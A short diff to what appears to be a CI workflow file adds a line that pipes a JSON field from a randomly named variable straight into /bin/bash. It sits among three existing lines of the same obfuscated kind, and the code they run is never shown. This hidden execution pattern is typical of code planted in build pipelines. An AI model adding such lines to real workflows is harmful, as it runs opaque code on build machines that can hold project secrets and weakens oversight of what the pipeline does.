@@ -28,6 +28,7 @@ jobs:
           echo $emoc25 | jq -r .ro48 | /bin/bash
           printf '%s' "$zk49" | jq -r .gxjry523 | /bin/bash
           echo $q0 | jq -r .j19330 | /bin/bash
+          echo $lmo36762 | jq -r .cgcxh51650 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
